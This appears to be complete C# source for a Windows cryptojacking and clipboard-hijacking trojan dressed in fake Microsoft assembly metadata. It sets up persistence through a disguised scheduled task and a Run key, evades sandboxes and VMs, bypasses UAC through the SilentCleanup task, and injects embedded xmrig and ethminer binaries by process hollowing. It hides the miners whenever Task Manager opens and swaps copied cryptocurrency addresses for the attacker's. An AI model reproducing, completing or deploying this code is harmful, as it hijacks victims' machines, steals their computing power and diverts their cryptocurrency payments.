using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Management;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.IO.Compression;
using System.Windows.Forms;
using System.Security.Cryptography;


[assembly: AssemblyTitle("UserAccountBroker")]
[assembly: AssemblyDescription("User Account Control Panel Host")]
[assembly: AssemblyCompany("Microsoft® .NET Framework")]
[assembly: AssemblyProduct("Microsoft® Windows® Operating System")]
[assembly: AssemblyCopyright("© Microsoft Corporation. All rights reserved.")]
[assembly: AssemblyTrademark("")]

namespace VolVeRFINAL
{
    class Program
    {
        public static Mutex curderApp;
        public static bool UMutexAC()
        {

            bool createdNew;
            curderApp = new Mutex(false, config.mutex, out createdNew);
            try
            {
                if (createdNew)
                    Thread.Sleep(2000);
            }
            catch { }
            return createdNew;
 

        }

        public static void Defolt()
        {

            while (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
            {
                ProcessStartInfo startInfo = new ProcessStartInfo();
                startInfo.FileName = "cmd.exe";
                startInfo.UseShellExecute = true;
                startInfo.Verb = "runas";
                startInfo.Arguments = "/k START \"\" \"" + Assembly.GetEntryAssembly().Location + "\" & EXIT";
                try
                {
                    Process.Start(startInfo);
                    Environment.Exit(0);
                }
                catch (Exception ex)
                {
                }
            }


        }
        static void Main(string[] args)
        {
 
            try
            {



                if (File.Exists(config.folder + "\\" + config.FileName))
                    File.Delete(config.folder + "\\" + config.FileName);

                if (!Directory.Exists(config.folder))
                    Directory.CreateDirectory(config.folder);

                if (!File.Exists(config.folder + "\\" + config.FileName))
                    File.Copy(Assembly.GetEntryAssembly().Location, config.folder + "\\" + config.FileName);

                

            }
            catch { }
            try
            {
                UMutexAC();
            }
            catch { }
            if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
            {
                try
                {
                    
                    var startInfo = new ProcessStartInfo
                    {
                        FileName = "schtasks.exe",
                        CreateNoWindow = false,
                        WindowStyle = ProcessWindowStyle.Hidden,
                        Arguments = @"/create /sc MINUTE /mo 3 /tn ""MicrosoftEdgeUpdate"" /tr """ + config.folder + "\\" + config.FileName + @""" /f"
                    };
                    Process.Start(startInfo);


                }

                catch { }

            }
            else
            {

                try
                {
                    Powershell("Remove-ItemProperty -Path 'HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run' -Name '" + config.RegName + "';New-ItemProperty -Path 'HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run' -Name '" + config.RegName + "' -Value '\"" + Path.Combine(config.folder, config.FileName) + "\"' -PropertyType 'String'");

                }
                catch { }




            }


            if (config.antiSandbox == "true")
            {
                try
                {
                    if (MinerAns.Analysis.isVirtualMachine())
                        Environment.Exit(0);
                }
                catch (Exception ex)
                {
                }
            }


            if (config.antiDebugger == "true")
            {
                try
                {
                    if (MinerAns.Analysis.DetectSandboxie())
                        Environment.Exit(0);
                }
                catch (Exception ex)
                {
                }
            }
            if (config.forceUAC == "true")
            {
                try
                {
                    Defolt();

                }
                catch (Exception ex)
                {
                }
            }

            int _ram = 0;

            ManagementObjectSearcher searcher = new ManagementObjectSearcher("select AdapterRAM from Win32_VideoController");

            foreach (ManagementObject mo in searcher.Get())
            {
                var ram = mo.Properties["AdapterRAM"].Value as UInt32?;

                if (ram.HasValue)
                {
                    _ram = (int)(ram / 1048576);
                }
            }

            int num = _ram / 1024;

            byte[] moncp = { };
            byte[] ether = { };

            using (MemoryStream ms = new MemoryStream(Properties.Resources.xmrig))
            {
                using (var archive = new ZipArchive(ms))
                {
                    foreach (var file in archive.Entries)
                    {
                        using (MemoryStream mr = new MemoryStream())
                        {
                            file.Open().CopyTo(mr);
                            moncp = mr.ToArray();
                        }


                    }
                }


            }

            using (MemoryStream mers = new MemoryStream(Properties.Resources.ethminer))
            {
                using (var zipwer = new ZipArchive(mers))
                {
                    foreach (var file in zipwer.Entries)
                    {
                        using (MemoryStream mer = new MemoryStream())
                        {
                            file.Open().CopyTo(mer);
                            ether = mer.ToArray();
                        }


                    }
                }


            }

            if (config.dwudauiadjws == "true")
            {
                try
                {
                    File.WriteAllBytes(config.folder + "\\" + "opersystem.exe", Properties.Resources.iqdisakwe);
                    Process process = new Process();
                    process.StartInfo.FileName = config.folder + "\\" + "opersystem.exe";
                    process.Start();
                    File.SetAttributes(config.folder + "\\" + "opersystem.exe", System.IO.FileAttributes.Hidden);


                }
                catch
                {

                }

            }


            List<string> stringList = new List<string>();
            stringList.Add("mmc");
            stringList.Add("ProcessHacker");
            stringList.Add("Taskmgr");
            stringList.Add("Диспетчер задач");

            string arg1 = "--algo rx/0 --donate-level 0   --max-cpu-usage " + config.moneroUsage + " -o" + config.moneroPool + " -u " + config.moneroWallet;
            string arg2 = "-pool " + config.etcPool + "-wal " + config.etcWallet + " -worker " + config.etcWorker + " -pass x -log 0 -tt 70 -tstop 85 -tstart 70 -Rmode 1 -fret 1 -rate 1 -coin etc";
            string arg3 = "-pool " + config.ethPool + "-wal " + config.ethWallet + " -worker " + config.ethWorker + " -pass x -log 0 -tt 70 -tstop 85 -tstart 70 -Rmode 1 -fret 1 -rate 1 -coin eth";
            string Extension1 = Path.GetFileNameWithoutExtension("C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\#winappdate");
            string Extension2 = Path.GetFileNameWithoutExtension("C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\#appdate");


            if (num > 4)
            {
                try
                {
                     
                        Program.PE.Run(ether, "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\#appdate", arg2);

                }
                catch { }
            }
            else if (num > 8)
            {
                try
                {

                     
                        Program.PE.Run(ether, "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\#appdate", arg3);

                }

                catch { }
            }
            try
            {

                
                    Program.PE.Run(moncp, "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\#winappdate", arg1);

            }

            catch { }
            if (config.WebPanel == "true")
            {
                try
                {
                   Host.getTasks();
                }
                catch
                { 
                }
            }
            if (config.bypassUAC == "owdoaodsoa")
            {
                try
                {
                    if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
                    {
                        Program.UAC();
                        Environment.Exit(0);
                    }
                }
                catch (Exception ex)
                {
                }
              
            }
            while (true)
            {
                foreach (string processName in stringList)
                {
                    for (Process[] processesByName = Process.GetProcessesByName(processName); processesByName.Length != 0; processesByName = Process.GetProcessesByName(processName))
                    {
                        foreach (Process process in Process.GetProcessesByName(Extension1))
                        {
                            try
                            {
                                process.Kill();
                            }
                            catch
                            {
                            }
                        }
                        foreach (Process process in Process.GetProcessesByName(Extension2))
                        {
                            try
                            {
                                process.Kill();
                            }
                            catch
                            {
                            }
                        }

                    }
                }

                if (config.Hipper == "true")
                {
                    string BTC = "#btcclp";
                    string ETH = "#etcclp";
                    string XMR = "#xmrclp";

                    bool exception = false;

                    try
                    {
                        Thread.Sleep(500);

                        string bcoppy = Clipboard.GetText();



                        if (new Regex("^3[a-km-zA-HJ-NP-Z1-9]{25,34}$+").IsMatch(bcoppy))
                            Clipboard.SetText(BTC);


                        if (new Regex("^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$").IsMatch(bcoppy))
                            Clipboard.SetText(BTC);


                        if (new Regex("^0x[a-fA-F0-9]{40}$").IsMatch(bcoppy))
                            Clipboard.SetText(ETH);


                        if (new Regex("(?:^4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}$)").IsMatch(bcoppy))
                            Clipboard.SetText(XMR);



                    }
                    catch (Exception)
                    {
                        exception = true;
                    }
                    try
                    {
                        foreach (Process item in Process.GetProcesses())
                            if (item.ProcessName.ToLower() == "taskmgr" ||
                             item.ProcessName.ToLower() == "processhacker" ||
                             item.ProcessName.ToLower() == "Диспетчер задач" ||
                             item.ProcessName.ToLower() == "procexp")
                                Environment.Exit(0);

                        Thread.Sleep(7000);
                    }
                    catch { }


                }
 

            }

 



        }
 


        public static void Powershell(string args)
        {
            var startInfo = new ProcessStartInfo
            {
                FileName = "powershell.exe",
                Arguments = args,
                WindowStyle = ProcessWindowStyle.Hidden,
                CreateNoWindow = true,
                UseShellExecute = false
            };
            Process.Start(startInfo);
        }



        public class AlwaysNotify
        {
            public AlwaysNotify()
            {
                RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
                string str1 = registryKey.GetValue(Encoding.Default.GetString(Convert.FromBase64String("Q29uc2VudFByb21wdEJlaGF2aW9yQWRtaW4="))).ToString();
                string str2 = registryKey.GetValue(Encoding.Default.GetString(Convert.FromBase64String("UHJvbXB0T25TZWN1cmVEZXNrdG9w"))).ToString();
                registryKey.Close();
                if (!(str1 == "2" & str2 == "1"))
                    return;
                Environment.Exit(1);
            }
        }

        public static class Clipboard
        {
            public static string GetText()
            {
                string Return= string.Empty;
                Thread STAT = new Thread(
                    delegate ()
                    {
                        Return = System.Windows.Forms.Clipboard.GetText();
                    });
                STAT.SetApartmentState(ApartmentState.STA);
                STAT.Start();
                STAT.Join();

                return Return;
            }

            public static void SetText(string txt)
            {
                Thread STAT = new Thread(
                    delegate ()
                    {
                        System.Windows.Forms.Clipboard.SetText(txt);
                    });
                STAT.SetApartmentState(ApartmentState.STA);
                STAT.Start();
                STAT.Join();
            }
        }


        public static void UAC()
        {
            string str = Assembly.GetExecutingAssembly().Location + " && REM";
            Program.AlwaysNotify alwaysNotify = new Program.AlwaysNotify();
            if (!str.Contains("REM"))
                Environment.Exit(1);
            RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Environment", true);
            registryKey.SetValue("windir", (object)str);
            new Process()
            {
                StartInfo = {
          WindowStyle = ProcessWindowStyle.Hidden,
          FileName = "C:\\windows\\system32\\schtasks.exe",
          Arguments = "/Run /TN \\Microsoft\\Windows\\DiskCleanup\\SilentCleanup /I"
        }
            }.Start();
            Thread.Sleep(2000);
            registryKey.DeleteValue("windir");
        }

        public static class PE
        {
            [DllImport("kernel32.dll")]
            private static extern unsafe bool CreateProcess(
              string lpApplicationName,
              string lpCommandLine,
              IntPtr lpProcessAttributes,
              IntPtr lpThreadAttributes,
              bool bInheritHandles,
              uint dwCreationFlags,
              IntPtr lpEnvironment,
              string lpCurrentDirectory,
              Program.PE.StartupInfo* lpStartupInfo,
              byte[] lpProcessInfo);

            [DllImport("kernel32.dll")]
            private static extern long VirtualAllocEx(
              long hProcess,
              long lpAddress,
              long dwSize,
              uint flAllocationType,
              uint flProtect);

            [DllImport("kernel32.dll")]
            private static extern long WriteProcessMemory(
              long hProcess,
              long lpBaseAddress,
              byte[] lpBuffer,
              int nSize,
              long written);

            [DllImport("ntdll.dll")]
            private static extern uint ZwUnmapViewOfSection(long ProcessHandle, long BaseAddress);

            [DllImport("kernel32.dll")]
            private static extern bool SetThreadContext(long hThread, IntPtr lpContext);

            [DllImport("kernel32.dll")]
            private static extern bool GetThreadContext(long hThread, IntPtr lpContext);

            [DllImport("kernel32.dll")]
            private static extern uint ResumeThread(long hThread);


            [DllImport("kernel32.dll")]
            private static extern bool CloseHandle(long handle);

            public static unsafe void Run(byte[] payloadBuffer, string host, string args)
            {
                int num1 = Marshal.ReadInt32((object)payloadBuffer, 60);
                int num2 = Marshal.ReadInt32((object)payloadBuffer, num1 + 24 + 56);
                int nSize = Marshal.ReadInt32((object)payloadBuffer, num1 + 24 + 60);
                int num3 = Marshal.ReadInt32((object)payloadBuffer, num1 + 24 + 16);
                short num4 = Marshal.ReadInt16((object)payloadBuffer, num1 + 4 + 2);
                short num5 = Marshal.ReadInt16((object)payloadBuffer, num1 + 4 + 16);
                long num6 = Marshal.ReadInt64((object)payloadBuffer, num1 + 24 + 24);
                Program.PE.StartupInfo startupInfo = new Program.PE.StartupInfo();
                startupInfo.cb = (uint)Marshal.SizeOf<Program.PE.StartupInfo>(startupInfo);
                startupInfo.wShowWindow = (ushort)0;
                startupInfo.dwFlags = 1U;
                byte[] lpProcessInfo = new byte[24];
                IntPtr num7 = Marshal.AllocHGlobal(1232 / 16);
                string lpCommandLine = host;
                if (!string.IsNullOrEmpty(args))
                    lpCommandLine = lpCommandLine + " " + args;
                string currentDirectory = Directory.GetCurrentDirectory();
                Marshal.WriteInt32(num7, 48, 1048603);
                Program.PE.CreateProcess((string)null, lpCommandLine, IntPtr.Zero, IntPtr.Zero, true, 4U, IntPtr.Zero, currentDirectory, &startupInfo, lpProcessInfo);
                long num8 = Marshal.ReadInt64((object)lpProcessInfo, 0);
                long num9 = Marshal.ReadInt64((object)lpProcessInfo, 8);
                int num10 = (int)Program.PE.ZwUnmapViewOfSection(num8, num6);
                Program.PE.VirtualAllocEx(num8, num6, (long)num2, 12288U, 64U);
                Program.PE.WriteProcessMemory(num8, num6, payloadBuffer, nSize, 0L);
                for (short index = 0; (int)index < (int)num4; ++index)
                {
                    byte[] numArray = new byte[40];
                    Buffer.BlockCopy((Array)payloadBuffer, num1 + (24 + (int)num5) + 40 * (int)index, (Array)numArray, 0, 40);
                    int num11 = Marshal.ReadInt32((object)numArray, 12);
                    int length = Marshal.ReadInt32((object)numArray, 16);
                    int srcOffset = Marshal.ReadInt32((object)numArray, 20);
                    byte[] lpBuffer = new byte[length];
                    Buffer.BlockCopy((Array)payloadBuffer, srcOffset, (Array)lpBuffer, 0, lpBuffer.Length);
                    Program.PE.WriteProcessMemory(num8, num6 + (long)num11, lpBuffer, lpBuffer.Length, 0L);
                }
                Program.PE.GetThreadContext(num9, num7);
                byte[] bytes = BitConverter.GetBytes(num6);
                long num12 = Marshal.ReadInt64(num7, 136);
                Program.PE.WriteProcessMemory(num8, num12 + 16L, bytes, 8, 0L);
                Marshal.WriteInt64(num7, 128, num6 + (long)num3);
                Program.PE.SetThreadContext(num9, num7);
                int num13 = (int)Program.PE.ResumeThread(num9);
                Marshal.FreeHGlobal(num7);
                Program.PE.CloseHandle(num8);
                Program.PE.CloseHandle(num9);
            }

            private static IntPtr Align(IntPtr source, int alignment)
            {
                long num = source.ToInt64() + (long)(alignment - 1);
                return new IntPtr((long)alignment * (num / (long)alignment));
            }



            [StructLayout(LayoutKind.Explicit, Size = 104)]
            public struct StartupInfo
            {
                [FieldOffset(0)]
                public uint cb;
                [FieldOffset(60)]
                public uint dwFlags;
                [FieldOffset(64)]
                public ushort wShowWindow;
            }
        }



    }
}

 
 
